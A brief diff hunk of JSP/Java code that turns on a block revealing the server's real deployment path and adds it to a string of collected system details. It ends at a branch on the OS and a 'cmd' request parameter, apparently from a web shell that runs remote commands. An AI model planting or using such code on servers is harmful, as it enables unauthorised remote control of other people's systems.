@@ -42,13 +42,13 @@ if(null != s1 && null != s2)
         szSys += "wlst=\"" + szTmp + "\"\n";
 }
 //  javax.servlet-api >= 3.1
-// try{
-//     if(null != request.getServletContext())
-//     {    
-//         String szKK = request.getServletContext().getResource("/").toString();
-//         szSys += "curRealPath=\"" + szKK + "\"";
-//     }
-// }catch(Exception e){}
+try{
+    if(null != getServletConfig().getServletContext())
+    {    
+        String szKK = getServletConfig().getServletContext().getResource("/").toString();
+        szSys += "curRealPath=\"" + szKK + "\"";
+    }
+}catch(Exception e){}
     
 
 if(-1 < szSys.indexOf("Windows") || null != cmd && -1 < cmd.indexOf("cmd"))
